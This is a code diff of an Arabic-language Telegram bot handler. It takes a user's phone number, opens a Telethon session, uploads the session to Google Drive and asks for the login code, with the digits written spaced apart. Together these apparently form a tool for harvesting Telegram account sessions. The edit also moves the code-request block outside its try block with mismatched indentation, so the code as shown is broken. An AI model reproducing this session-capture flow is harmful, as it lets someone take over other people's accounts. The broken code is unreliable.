@@ -120,7 +120,16 @@ async def process_phone(update, context):
     clients[user_id] = client
     phone_numbers[user_id] = phone_number
 
-    print("Starting drive session")
+    print("Try was here before")
+
+        #try was end here before
+        
+        # طلب رمز التحقق
+        await client.send_code_request(phone_number)
+        print("تم إرسال رمز التحقق.")
+        await update.message.reply_text("تم إرسال رمز التحقق إلى رقمك. الرجاء إدخال الرمز (مثل: 2 2 9 3 0):")
+        return CODE
+
     try:
         print("sttart here")
         await client.connect()
@@ -178,23 +187,13 @@ async def process_phone(update, context):
                 print(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
                 await update.message.reply_text(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
                 return PHONE
-
-        # طلب رمز التحقق
-        await client.send_code_request(phone_number)
-        print("تم إرسال رمز التحقق.")
-        await update.message.reply_text("تم إرسال رمز التحقق إلى رقمك. الرجاء إدخال الرمز (مثل: 2 2 9 3 0):")
-        return CODE
-
+                
     except Exception as e:
         print(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         return PHONE
 
-    if await client.is_user_authorized():
-        print("222المستخدم مصرح له مسبقًا.")
-    else:
-        print("222المستخدم غير مصرح له. سيتم إرسال رمز التحقق.")
-        
+    
 
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
